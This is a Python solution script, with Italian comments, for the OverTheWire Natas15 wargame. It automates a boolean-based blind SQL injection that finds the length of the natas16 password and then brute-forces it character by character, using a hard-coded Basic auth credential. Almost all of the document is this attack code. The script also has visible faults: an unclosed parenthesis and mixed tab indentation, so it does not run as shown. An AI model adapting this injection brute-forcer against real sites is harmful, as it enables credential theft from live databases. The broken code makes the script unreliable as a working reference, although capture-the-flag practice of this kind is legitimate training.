''' 
Solution-Script for Natas15 - OverTheWire

Daruma's_eye
'''
from string import ascii_letters
from string import digits
from time import sleep
from requests import get                # ==>  per fare richieste get      
from urllib.parse import quote          # ==>  per fare codificare l'injection in codifica URL

alpha_numeric  = ascii_letters + digits
delay          = 0.1

#Header delle richieste get, viene usato il campo Auth per accdere al sito tramite password,
#   il valore è un base64 dell'utente e della password
header={'Host'         : 'natas15.natas.labs.overthewire.org'\
       ,'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'}



#Nella prima parte si applica la query { natas16" and password like '___' ; # } 
#   al campo username per stimare la lunghezza della password, si controlla quindi se la risposta 
#   contiene la stringa 'This user exists'
incomplete_injection = 'natas16" and password like \''

password_length = 0
while True:
    password_length += 1
    print( 'Testing password of '+str( password_length )+' chars' )
    incomplete_injection = incomplete_injection + '_'
    injection = incomplete_injection + '\';# '
    
    injection = quote( injection,safe= ''
    url = 'http://natas15.natas.labs.overthewire.org/?username='+ injection
    
    req  = get( url, headers= header )
    
    if 'This user exists.' in req.text:
        break

    elif 'This user doesn\'t exist.' in req.text:
        print( 'This is not the right length...Incrementing...' )
    else:
        print( '########## GENERIC ERROR ##########' )
        exit(1)

    sleep( delay )

print( 'It seems that the password is '+str( password_length )+' chars long.\nWe can proceed with bruteforcing...' )

sleep( 0.5 )


#Nella seconda parte si applica la query { natas16" and password like ''; # } 
#   come nella prima parte ma in questo caso si fa il bruteforcing carattere per carattere
password=''
for i in range( password_length ):

    for char in alpha_numeric:

        print( 'Testing char '+ char +' for position '+ str(i) )
        injection = 'natas16" and password like binary \'' + password + char
        
        if( i!=password_length-1 ):
            for j in range(password_length-i-1):
                injection = injection+'_'
        injection= injection+'\';# '     
        print( 'Testing '+injection )

        injection = quote( injection,safe='' )
	    url = 'http://natas15.natas.labs.overthewire.org/?username='+ injection        
    
        req  = get( url, headers= header )
    
        if 'This user exists.' in req.text:
            password = password+char
            print( 'The char of position '+ str(i) +' is : '+ char )
            break 

        elif 'This user doesn\'t exist.' in req.text:
            print( 'This is not the right char for this position...' )
        
        else:
            print( '########## GENERIC ERROR ##########' )
            exit(1)

        sleep( delay )

print( 'We have the password! Here it is: '+password )

